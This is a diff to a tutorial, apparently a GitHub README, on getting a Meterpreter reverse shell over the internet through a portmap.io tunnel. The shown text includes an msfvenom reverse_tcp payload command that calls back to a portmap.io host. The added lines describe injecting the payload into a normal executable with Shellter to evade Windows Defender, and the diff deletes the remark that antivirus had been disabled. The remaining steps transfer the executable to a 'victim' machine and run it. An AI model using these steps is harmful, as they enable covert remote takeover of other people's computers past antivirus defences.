@@ -40,7 +40,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=random123-33188.portmap.io
 
 ![image](https://user-images.githubusercontent.com/86168235/128928364-dc24c900-172a-44da-84e5-cd263ff5e2a0.png)
 
-Here the LHOST and LPORT are the **hostname** and **port** you took note from [portmap.io](https://portmap.io).
+Here the LHOST and LPORT are the **hostname** and **port** you took note from [portmap.io](https://portmap.io). Next, I injected the payload into a normal executable using `Shellter` to bypass Windows Defender. The latest Windows Defender failed to detect it. 
+
+![image](https://user-images.githubusercontent.com/86168235/129901072-4eb218e1-4528-49a9-812a-f665c638a38e.png)
 
 **Next**, start the **openvpn** connection to forward traffic to your machine(use the openvpn command you noticed earlier).
 
@@ -52,18 +54,18 @@ Take a note of the ip address of the `tun0`(or your openvpn tunnel interface).
 
 Now, set up a meterpreter listener as follows:-
 
-![image](https://user-images.githubusercontent.com/86168235/128928689-042d19fd-3c44-4f20-8821-366d2e06df9a.png)
+![image](https://user-images.githubusercontent.com/86168235/129900389-25e1b3a5-3cb7-4264-9457-7c8db0fb8aae.png)
 
 Here, lhost is tun0 interface ip, lport is the port we set on [portmap.io](https://portmap.io), payload is what we choose with **msfvenom**. 
 
-**Next**, transfer the `portmap.exe` exploit to victim windows machine and execute it. Here, I've disabled **AV** before running the executable.
+**Next**, transfer the `portmap.exe` exploit to victim windows machine and execute it.
 
 ![image](https://user-images.githubusercontent.com/86168235/128928898-4d6bc6d9-b048-4eeb-9d1c-29a09168d32c.png)
 
 
 Next, you'll see what I call **the love of life**😍🥰, the classic **meterpreter reverse shell!!!**
 
-![image](https://user-images.githubusercontent.com/86168235/128928966-8bf50f23-9de5-4706-ba34-0325a7f859c3.png)
+![image](https://user-images.githubusercontent.com/86168235/129901719-d9190d99-c864-4644-9a85-1819c94641ea.png)
 
 
 **Note**:- Here, my kali machine is connected to my home network and the windows machine is connected to my Mobile hotspot.
